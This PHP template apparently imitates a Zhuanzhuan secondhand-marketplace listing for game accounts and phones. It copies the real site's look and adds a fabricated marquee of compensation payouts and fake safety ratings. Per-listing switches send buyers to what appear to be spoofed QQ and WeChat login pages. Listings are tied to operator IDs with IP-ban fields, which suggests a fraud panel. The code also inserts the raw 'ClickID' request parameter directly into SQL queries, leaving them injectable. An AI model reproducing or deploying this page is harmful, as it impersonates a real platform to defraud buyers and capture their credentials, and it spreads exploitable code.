<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');


if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");
	
	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	
	
	if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
                exit;
            }
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){

    }
}
	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
	    
		_query("
			INSERT INTO useraddress (
						
								titlea,
								type,
								class,
								gid,
								aid,
								state,
								utime
								) 
						VALUES (
							
						'{$_GoodsID['title']}',
								1,
								1,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['in_admin_id']}',
								1,
								'{$_CURRENT_TIME}'
								)"
			);
		  
		  session_destroy();
	}
	

	
	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){
		
	}
	//更新点击率	
	mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{
	
}

if($_GoodsID['oldnew']==1){
$oldnew888="全新";
$oldnew666="未激活，未使用过，全部功能正常，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==2){
$oldnew888="99新";
$oldnew666="仅激活，未使用过，全部功能正常，如下为真机实拍图";
        
}
if($_GoodsID['oldnew']==3){
$oldnew888="98新";
$oldnew666="相当于新机仅使用一周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==4){
$oldnew888="95新";
$oldnew666="相当于新机仅使用二周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
    $oldnew555="none";
}
if($_GoodsID['oldnew']==5){
$oldnew888="88新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";}
if($_GoodsID['oldnew']==6){
$oldnew888="85新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";

}



if($_GoodsID['oldnewa']==1)
$oldnewa88="/detail3/dxdl.php?weixin";
if($_GoodsID['oldnewa']==2)
$oldnewa88="/detail3/wxdl.php?weixin";

if($_GoodsID['oldnewb']==3)
$oldnewb888="4G全网通";
if($_GoodsID['oldnewb']==4)
$oldnewb888="5G全网通";

if($_GoodsID['oldnewc']==1){
$oldnewc888="yue99();";
$oldnewc8888="block";}
if($_GoodsID['oldnewc']==2){
$oldnewc888="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'";
$oldnewc8888="none";}


if($_GoodsID['oldnewe']==1){
$oldnewe9999="none";
$oldnewe8888="";
$oldnewe7777="正通过平台保卖寄存在石家庄验机中心";
    
}
if($_GoodsID['oldnewe']==2){
$oldnewe9999="";
$oldnewe8888="none";
$oldnewe7777="支持验机";
}


if($_GoodsID['qcyanji']==1){
$qcyanji777="";
$qcyanji888="Android - 安卓系统 <i class='icon-android'></i>";}
if($_GoodsID['qcyanji']==2){
$qcyanji777="【苹果版】";
$qcyanji888="App Store - 苹果正版 <i class='icon-ios'></i>";}

?>
<!doctype html>
<html lang="en" style="font-size: 19.5px;">

<head>
    <meta charset="utf-8">


    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <!-- <link rel="dns-prefetch" href="//m.zhuanzhuan.com"> -->
    <!-- <link rel="dns-prefetch" href="//s1.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//img1.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//app.zhuanzhuan.com"> -->
    <!-- <link rel="dns-prefetch" href="//s.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//pic1.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//pic2.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//pic3.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//pic4.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//pic5.zhuanstatic.com"> -->
    <!-- <link rel="dns-prefetch" href="//pic6.zhuanstatic.com"> -->
    <script src="js/dll-6f5fc491ff9fbf33f1b8.js" defer=""></script>
    <title>【转转】<?php echo $_GoodsID['title']; ?></title>
    <script>
        try {
            "m.zhuanzhuan.58.com" === document.domain && location.replace(location.href.replace("m.zhuanzhuan.58.com", "m.zhuanzhuan.com"))
        } catch (a) {
            console.log(a)
        }
    </script>
    <style id="AlookElementHide">
        .MDQxNQ,
        #appss,
        .show-app2,
        bkveng,
        #ppaxs,
        [class*="ad_img"],
        [class*="ad_head"],
        [class*="ad_foot"],
        [class*="ad_thread"],
        [id*="ad_img"],
        [id*="ad_head"],
        [id*="ad_foot"],
        [id*="ad_thread"],
        .AlookElementHide {
            display: none !important;
            height: 0px !important;
            line-height: 0px !important;
        }
    </style>
    <script type="text/javascript" src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/add.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/index.css">
    <link rel="stylesheet" href="css/add.css">
    <link rel="prefetch" as="script" href="https://s1.zhuanstatic.com/open/ZZOpenBusiness/static/js/chunk-74bd0103.ba5ed2aa.js">
    <link rel="prefetch" as="script" href="https://s1.zhuanstatic.com/open/ZZOpenBusiness/static/js/chunk-77212e5d.6b808c7c.js">
    <link rel="prefetch" as="script" href="https://s1.zhuanstatic.com/open/ZZOpenBusiness/static/js/chunk-744a4a34.0cffc27f.js">
    <link rel="prefetch" as="script" href="https://s1.zhuanstatic.com/open/ZZOpenBusiness/static/js/chunk-7499a7eb.e74895a7.js">
    <link rel="prefetch" as="script" href="https://s1.zhuanstatic.com/open/ZZOpenBusiness/static/js/chunk-7735a91e.77e24cce.js">
    <script charset="utf-8" src="js/common.852c79f6.js"></script>
    <link rel="stylesheet" type="text/css" href="css/chunk-326325f8.ebe41f05.css">
    <script charset="utf-8" src="js/chunk-326325f8.a24ebc13.js"></script>
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
    <link rel="stylesheet" type="text/css" href="css/chunk-1ed0777e.141bf79a.css">
    <script charset="utf-8" src="js/chunk-1ed0777e.9b3672c9.js"></script>
    <script type="text/javascript" async="async" src="js/getmhostlist.js"></script>
</head>

<body class="">
    <div id="app">
        <section data-v-4265e913="" class="detail">
            <div data-v-7c3eb4ae="" data-v-4265e913="" class="detail-fixed-top ios-fixed-top" style="height: 47px;">
                <div class="z-fix-top z-fix-top--fixed" style="background-color: rgba(255, 255, 255, 0); padding-top: 0px; z-index: 50; background-position: initial initial; background-repeat: initial initial;">
                    <div data-v-7c3eb4ae="" class="top-wrap">
                        <i data-v-7c3eb4ae="" class="back"></i>
                        <i data-v-7c3eb4ae="" class="more"></i>
                        <i data-v-7c3eb4ae="" class="share"></i>
                        <div data-v-7c3eb4ae="" class="simpledropdown z-simple-dropdown">
                            <div class="z-simple-dropdown__trigger">
                                <i data-v-7c3eb4ae="" class="z-icon zziconfont zziconfont-more">
                                    <!---->
                                </i>
                            </div>
                            <div class="z-simple-dropdown__popover" style="display: none;">
                                <ul class="z-simple-dropdown__menu">
                                    <li class="z-simple-dropdown__item">
                                        <div class="z-simple-dropdown__icon">
                                            <i class="z-icon zziconfont zziconfont-message">
                                                <!---->
                                            </i>
                                        </div>
                                        <div class="z-simple-dropdown__content z-hairline--bottom" style="text-align: left;">消息</div>
                                    </li>
                                    <li class="z-simple-dropdown__item">
                                        <div class="z-simple-dropdown__icon">
                                            <i class="z-icon z-icon-star-o">
                                                <!---->
                                            </i>
                                        </div>
                                        <div class="z-simple-dropdown__content z-hairline--bottom" style="text-align: left;">收藏夹</div>
                                    </li>
                                </ul>
                                <i class="z-simple-dropdown__tip-angle"></i>
                            </div>
                        </div>
                        <!---->
                        <div data-v-7c3eb4ae="" class="z-marquee page-marquee hide">
                            <div class="z-marquee-container" style="transition: transform 600ms ease-in-out; transform: translateY(-256px);">
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2987******获赔金额1803.1元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户Du15******获赔金额150元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2913******获赔金额538元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户3506******获赔金额460元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户1041******获赔金额2172元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2147******获赔金额271元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户3445******获赔金额190元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户1638******获赔金额2875元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2359******获赔金额500元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户3616******获赔金额115元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2193******获赔金额520元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户3146******获赔金额100元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户1251******获赔金额450元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户tang******获赔金额333元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2949******获赔金额171元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户8117******获赔金额100元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2314******获赔金额518元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户1754******获赔金额520元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户3151******获赔金额4000元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户3120******获赔金额589元</span>
                                </div>
                                <div data-v-7c3eb4ae="" class="page-marquee-item">
                                    <span data-v-7c3eb4ae="">用户2987******获赔金额1803.1元</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div data-v-4265e913="" class="info-tabs z-tabs z-tabs--line" style="display: none;">
                        <div class="z-tabs__wrap">
                            <div class="z-tabs__nav z-tabs__nav--line z-tabs__nav--center">
                                <div class="z-tab z-tab--active">
                                    <span class="z-tab__title z-tab__title--block">
                                        <span>交易流程</span>
                                        <!---->
                                    </span>
                                </div>
                                <div class="z-tab">
                                    <span class="z-tab__title z-tab__title--block">
                                        <span>宝贝详情</span>
                                        <!---->
                                    </span>
                                </div>
                                <div class="z-tab">
                                    <span class="z-tab__title z-tab__title--block">
                                        <span>卖家信息</span>
                                        <!---->
                                    </span>
                                </div>
                                <div class="z-tabs__line" style="transform: translateX(112.5px); transition-duration: 0.3s;"></div>
                            </div>
                        </div>
                        <div class="z-tabs__content">
                            <div data-v-4265e913="" class="z-tab__pane" style=""></div>
                            <div data-v-4265e913="" class="z-tab__pane" style="display: none;">
                                <!---->
                            </div>
                            <div data-v-4265e913="" class="z-tab__pane" style="display: none;"></div>
                        </div>
                    </div>
                </div>
            </div>
            <div data-v-4265e913="" class="img-stance margin-top">
                <!---->
                <section zz-sectionid="104" class="banner-wrap" data-v-631ec3f2="">

                    <div class="banner-container" data-v-631ec3f2="" style="background-color: #e9e9e9;">

                        <div class="z-swipe" data-v-631ec3f2="">


                                    <div class="z-swipe__track" style="width: 100%; transition-duration: 0ms; transform: translateX(0px);">

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img1'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img2'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img3'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img4'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img5'] ?>" lazy="loaded">

                                            </div>

                                        </div>



                                    </div>
                                </div>
                                <div id="count" class="custom-indicator" data-v-631ec3f2="">

                                </div>
                            </div>
                            </div>
                            <div data-v-7f8347dc="" data-v-4265e913="">
                                <section data-v-7f8347dc="" class="guarantee guarantee-ios">
                                    <div data-v-7f8347dc="" class="guarantee-info">
                                        <span data-v-7f8347dc="" class="guarantee-info-text">
                                            可包赔3年

                                            <span data-v-7f8347dc=""> · </span></span>
                                        <span data-v-7f8347dc="" class="guarantee-info-text">
                                            协议保障

                                            <!---->
                                        </span>
                                    </div>
                                </section>
                                <section data-v-7f8347dc="" class="head">
                                    <div data-v-7f8347dc="" class="price">
                                        <div data-v-7f8347dc="" class="left">
                                            <span data-v-7f8347dc="" class="unit">¥</span>
                                            <div data-v-7f8347dc="" class="num">
                                                <span data-v-7f8347dc=""><?php echo $_GoodsID['price']; ?></span>
                                                <div data-v-7f8347dc="" class="price-label">
                                                    <!---->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-7f8347dc="" class="title">
                                        <!---->
                                        <!---->
                                        <span data-v-7f8347dc="">  <?php echo $_GoodsID['title']; ?></span>
                                    </div>
                                    <div data-v-7f8347dc="" class="label-wrap">

                                        <div data-v-7f8347dc="" class="stars">
                                            <div data-v-7f8347dc="" class="xingji">
                                                <p data-v-7f8347dc="" class="top">安全星级
                                                    <i data-v-7f8347dc="" class="z-icon zziconfont zziconfont-info">
                                                        <!---->
                                                    </i>
                                                </p>
                                                <div data-v-ea4a0ffa="" data-v-7f8347dc="" class="star">
                                                    <div data-v-ea4a0ffa="" class="star-item full"></div>
                                                    <div data-v-ea4a0ffa="" class="star-item full"></div>
                                                    <div data-v-ea4a0ffa="" class="star-item full"></div>
                                                    <div data-v-ea4a0ffa="" class="star-item full"></div>
                                                    <div data-v-ea4a0ffa="" class="star-item full"></div>
                                                </div>
                                            </div>
                                            <div data-v-7f8347dc="" class="xingjia">
                                                <p data-v-7f8347dc="" class="top">性价比：</p>
                                                <p data-v-7f8347dc="">30.55 ｜ 超过95%的同类商品
                                                    <i data-v-7f8347dc="" class="z-icon z-icon-arrow">
                                                        <!---->
                                                    </i>
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-v-7f8347dc="" class="seller-wrap">
                                        <div data-v-7f8347dc="" class="tips">
                                            <span data-v-7f8347dc="" class="“tips-item">首次出售</span>
                                            <span data-v-7f8347dc="" class="split"></span>
                                            <span data-v-7f8347dc="" class="“tips-item">日玩24h</span>
                                            <span data-v-7f8347dc="" class="split"></span>
                                            <span data-v-7f8347dc="" class="“tips-item"><?php echo $_GoodsID['doods_num'];?></span>
                                        </div>
                                        <span data-v-7f8347dc="" class="seller-wrap-want"><?php echo $_GoodsID['xiangyao']; ?>人想要</span>
                                    </div>
                                </section>
                                <!---->
                            </div>
                            <!---->
                            <section data-v-299099cd="" data-v-4265e913="" class="procedure" multisafegapday="0">
                                <div data-v-299099cd="" class="procedure-name">流程</div>
                                <div data-v-299099cd="" class="procedure-info">
                                    <div data-v-299099cd="" class="procedure-info-top">下单后请登录游戏验号，验号后联系专属客服为您换绑</div>
                                    <div data-v-299099cd="" class="procedure-info-bottom"></div>
                                </div>
                            </section>
                            <!---->
                            <section data-v-3f8f65c9="" data-v-4265e913="" class="page">
                                <div data-v-3f8f65c9="" class="page-left">活动</div>
                                <div data-v-3f8f65c9="" class="page-right">
                                    <p data-v-3f8f65c9="" class="title">
      账号全新安全模式，认证卖家永久包赔
      
<i data-v-3f8f65c9="" class="right-icon z-icon z-icon-arrow">
<!----></i></p>
<div data-v-3f8f65c9="" class="img">
<img data-v-3f8f65c9="" src="https://pic2.zhuanstatic.com/zhuanzh/29ede8f2-dc05-4d85-95e3-a54ab93d855c.png" alt=""></div></div></section>
<section data-v-19aebab7="" data-v-4265e913="" class="detailinfo">
<!---->
<div data-v-19aebab7="" class="detailinfo-main detailinfo-main-account">
<p data-v-19aebab7="" class="title">
      账号介绍
    </p>
<div data-v-19aebab7="" class="accountinfo">
<section data-v-19aebab7="" class="goods-info-param game-info">
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-gameInfo">
<div data-v-19aebab7="" class="goods-info-param-key">游戏名称</div>
<div data-v-19aebab7="" class="goods-info-param-value"><?php echo $_GoodsID['user_name'];?></div></div>
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-gameInfo">
<div data-v-19aebab7="" class="goods-info-param-key">客户端</div>
<div data-v-19aebab7="" class="goods-info-param-value"><?php echo $_GoodsID['doods_num'];?></div></div></section>
<section data-v-19aebab7="" class="goods-info-param">
<div data-v-19aebab7="" class="goods-info-param-item">
<div data-v-19aebab7="" class="goods-info-param-key">是否秒绑</div>
<div data-v-19aebab7="" class="goods-info-param-value">已绑定</div></div>
<div data-v-19aebab7="" class="goods-info-param-item">
<div data-v-19aebab7="" class="goods-info-param-key">账号类型</div>
<div data-v-19aebab7="" class="goods-info-param-value">成品号</div></div>
<div data-v-19aebab7="" class="goods-info-param-item">
<div data-v-19aebab7="" class="goods-info-param-key">防沉迷</div>
<div data-v-19aebab7="" class="goods-info-param-value">否</div></div></section>
<section data-v-19aebab7="" class="goods-info-param account-attr">
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-accountAttr">
<div data-v-19aebab7="" class="goods-info-param-key">账号来源</div>
<div data-v-19aebab7="" class="goods-info-param-value">自己注册</div></div>
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-accountAttr">
<div data-v-19aebab7="" class="goods-info-param-key"><?php echo $_GoodsID['region'];?></div>
<div data-v-19aebab7="" class="goods-info-param-value"><?php echo $_GoodsID['att_color'];?></div></div>
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-accountAttr">
<div data-v-19aebab7="" class="goods-info-param-key"><?php echo $_GoodsID['att_channel'];?></div>
<div data-v-19aebab7="" class="goods-info-param-value"><?php echo $_GoodsID['yanjifeiyong'];?></div></div>
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-accountAttr">
<div data-v-19aebab7="" class="goods-info-param-key"><?php echo $_GoodsID['yanse'];?></div>
<div data-v-19aebab7="" class="goods-info-param-value"><?php echo $_GoodsID['neicun'];?></div></div>
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-accountAttr">
<div data-v-19aebab7="" class="goods-info-param-key"><?php echo $_GoodsID['chandi'];?></div>
<div data-v-19aebab7="" class="goods-info-param-value"><?php echo $_GoodsID['imei'];?></div></div>
<div data-v-19aebab7="" class="goods-info-param-item goods-info-param-accountAttr">
<div data-v-19aebab7="" class="goods-info-param-key"><?php echo $_GoodsID['appdz'];?></div>
<div data-v-19aebab7="" class="goods-info-param-value"><?php echo $_GoodsID['zidingyi1'];?></div></div></section></div>
<div data-v-19aebab7="" class="seller-word">
      卖家寄语
                                    </div>
                                    <section data-v-19aebab7="" class="goods-detail">
                                        <?php echo $_GoodsID['goods_desc'];?>

                                        <!---->
                                    </section>
                                </div>
                                <!---->
                            </section>
                            <section data-v-5481b09e="" data-v-4265e913="" class="detail-user">
                                <div data-v-5481b09e="" class="detail-user-title">
                                    关于卖家
                                </div>
                                <div data-v-5481b09e="" class="detail-user-info">
                                    <div data-v-5481b09e="" class="detail-user-info-avater" style="background-image: url(<?php echo $_GoodsID['goods_img1'] ?>);">
                                        <div data-v-5481b09e="" class="detail-user-info-avater-shiren"></div>
                                    </div>
                                    <div data-v-5481b09e="" class="detail-user-info-detail">
                                        <div data-v-5481b09e="" class="detail-user-info-detail-nickname">
                                            <?php echo $_GoodsID['zidingyi8'];?>
                                        </div>
                                        <div data-v-5481b09e="" class="detail-user-info-detail-other">
                                            <img data-v-5481b09e="" src="img/2181d6c1-7552-4fc2-b3d3-50f80f485356.png" alt="" srcset="" class="weixinfen">
                                        </div>
                                    </div>
                                    <div data-v-5481b09e="" class="detail-user-info-like">
                                        + 关注
                                    </div>
                                </div>
                                <!---->
                                <div data-v-5481b09e="" class="detail-user-level">
                                    <div data-v-5481b09e="" class="detail-user-level-cate">
                                        <p data-v-5481b09e="" class="detail-user-level-cate-value"><?php echo $_GoodsID['qcyanji'];?></p>
                                        <p data-v-5481b09e="" class="detail-user-level-cate-desc">在售宝贝</p>
                                    </div>
                                    <div data-v-5481b09e="" class="detail-user-level-cate">
                                        <p data-v-5481b09e="" class="detail-user-level-cate-value"><?php echo $_GoodsID['freight'];?></p>
                                        <p data-v-5481b09e="" class="detail-user-level-cate-desc">累计交易</p>
                                    </div>
                                    <div data-v-5481b09e="" class="detail-user-level-cate">
                                        <p data-v-5481b09e="" class="detail-user-level-cate-value">100
                                            <span data-v-5481b09e="" class="rate">%</span>
                                        </p>
                                        <p data-v-5481b09e="" class="detail-user-level-cate-desc">回复率</p>
                                    </div>
                                </div>
                            </section>
                            <!---->
                            <div class="page-detail">
                                <section data-v-67a48718="" class="faq-wrap">
                                    <div data-v-67a48718="" class="faq-wrap-title">
                                        <h4 data-v-67a48718="">常见问题</h4> <span data-v-67a48718="" class="btn">查看更多<img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAP1BMVEUAAACbm5uZmZmampqZmZmampqZmZmbm5uampqgoKCZmZmampqampqampqZmZmampqZmZmampqbm5ubm5uZmZkHEZ4HAAAAFHRSTlMAMOwy+u7OGE0S1mFW792rqnlFIYuvnHgAAABeSURBVDjL7dE5DoAwDERRO5DEEAjb3P+shI7OLqxISPz6VTP0mXLJOkqIbEAGxbGpwaJCXxV81eqpLk0JgEM7ugIjK2ZuRvqY6TGLYpKfgcUUZcTNYKgaDJ270N+7G7FfBgs6dT1AAAAAAElFTkSuQmCC"></span>
                                    </div>
                                    <ul data-v-67a48718="" class="normal">
                                        <li data-v-67a48718="">
                                            <div data-v-67a48718="" class="tt">
                                                1.用户支付方式有哪些？
                                                <img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="">
                                            </div>
                                            <p data-v-67a48718="" class="active">平台可支持花呗、微信支付（储蓄卡&amp;信用卡）和组合支付。</p>
                                        </li>
                                        <li data-v-67a48718="">
                                            <div data-v-67a48718="" class="tt">
                                                2.交易过程中，卖家让我支付押金，要给他吗？
                                                <img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="close-img">
                                            </div>
                                            <p data-v-67a48718="" class="">答：如遇交易中让缴纳钱款的请立即举报</p>
                                        </li>
                                        <li data-v-67a48718="">
                                            <div data-v-67a48718="" class="tt">
                                                3.怎么买号啊，一脸懵逼？
